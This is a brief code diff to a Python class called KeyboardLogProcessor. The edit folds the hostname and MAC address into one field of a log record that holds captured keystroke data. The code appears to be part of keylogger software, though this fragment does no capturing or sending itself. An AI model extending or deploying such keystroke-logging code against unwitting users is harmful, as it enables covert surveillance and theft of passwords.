@@ -8,9 +8,10 @@ class KeyboardLogProcessor:
 
     def get_computer_info(self):
         mac = get_mac()
+        computer_name = socket.gethostname()
         return {
-            "computer_name": socket.gethostname(),
-            "mac_address": mac
+            "computer_name": f"{computer_name} - {mac}"
+
         }
 
     def process_keylog(self, keylog_str):
@@ -20,7 +21,6 @@ class KeyboardLogProcessor:
         self.logs = {
             "timestamp": time_stamp,
             "computer_name": computer_info["computer_name"],
-            "mac_address": computer_info["mac_address"],
             "data": keylog_str
         }
 
